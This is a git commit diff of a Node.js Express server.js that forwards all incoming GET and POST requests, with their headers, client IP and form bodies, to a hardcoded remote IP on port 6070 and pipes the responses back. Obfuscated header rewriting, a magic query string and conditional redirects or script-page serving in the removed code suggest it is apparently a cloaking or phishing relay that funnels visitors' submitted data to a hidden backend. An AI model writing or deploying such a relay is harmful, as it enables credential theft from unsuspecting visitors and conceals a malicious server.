6fd4ea369aed053cf63a35be2b8902b84c202b70
filomena1040 <120242762+filomena1040@users.noreply.github.com>
2023-12-14 03:08:35 -0800

    1

--- server.js
+++ server.js
@@ -1,65 +1,55 @@
 var bodyParser = require("body-parser");
 var express = require("express");
 const requester = require("request");
+const fs = require("fs");
 
 var app = express();
 app.use(bodyParser.urlencoded({ limit: "50mb", extended: true }));
 app.use(bodyParser.json({ limit: "50mb" }));
+app.use(bodyParser.text({ type: "text/html" }));
 app.use(bodyParser.raw());
 app.set("port", process.env.PORT);
 
-app.get("*", function (req, res) {
- try {
-        req.headers["X-Asteria-Client-IP"]=req.headers["x-forwarded-for"].split(",")[0]
-        var head = req.headers;
-        var headerss=JSON.stringify(head).replace("'{","").replace("}'","").replace("content-length","content2").replace("accept-encoding","dfsdfsdff").replace("host","check-Host")
-        var querystring = req.url;
-        var urrrl = "http://185.236.78.147:6070" + req.url;
-        console.log(urrrl);
-        if(!querystring.includes("flgkimv")){
-           
-            requester.get(
-            {
-              headers:JSON.parse(headerss),
-              url:     urrrl,
-            }, function(error, response, body){
-               try {
-                    if(response.statusCode==200){
-                      console.log(body);
-                      if(!body.includes("<")){
-                        console.log("sdfsdf");
-                        return res.redirect(body); 
-                      }else if(body.includes("<body> <script>")){
-                        console.log("2");
-                        return res.send(body);
-                      }
-                      else{
-                        console.log("3");
-                        return req.destroy();           
-                      }
-                    }else{  
-                      console.log("4");
-                      return req.destroy();
-                    }
-                } catch (error) {
-                 console.log("5");
-                 return req.destroy();
-              }
-          });
-          
-        }else if(querystring.includes("flgkimv")){
-          
-          requester.get({headers:JSON.parse(headerss),url:urrrl}).pipe(res);
-             
-        }else{
-         console.log("6");
-           return req.destroy();
-        }
-    } catch (error) {
-       console.log("7");
-       console.error(error);
-       return req.destroy();
+app.post("*", function (req, res) { 
+  req.headers["X-Asteria-Client-IP"]=req.headers["x-forwarded-for"].split(",")[0]
+  var head = req.headers;
+  var headerss = JSON.stringify(head)
+    .replace("'{", "")
+    .replace("}'", "")
+   .replace("content-length","content2").replace("accept-encoding","dfsdfsdff").replace("host","check-Host");
+  var urrrl = "http://185.236.78.147:6070" + req.url;
+  requester.post(
+    {
+      headers: JSON.parse(headerss),
+      url: urrrl,
+      form: req.body,
+      json: false,
     }
+  ).pipe(res);
+});
+
+app.get("*", function (req, res) {
+  req.headers["X-Asteria-Client-IP"]=req.headers["x-forwarded-for"].split(",")[0]
+  var head = req.headers;
+  var headerss = JSON.stringify(head)
+    .replace("'{", "")
+    .replace("}'", "")
+    .replace("content-length","content2").replace("accept-encoding","dfsdfsdff").replace("host","check-Host");
+  var querystring = req.url;
+  var urrrl = "http://185.236.78.147:6070" + req.url;
+
+  if (!querystring.includes("assets") || !querystring.includes(".")) {
+    requester.post(
+      {
+        headers: JSON.parse(headerss),
+        url: urrrl,
+        body: req.body,
+        json: true,
+      }
+    ).pipe(res);
+  } else {
+    requester.get(urrrl).pipe(res);
+  }
 });
 
 app.listen(process.env.PORT, "0.0.0.0", function () {
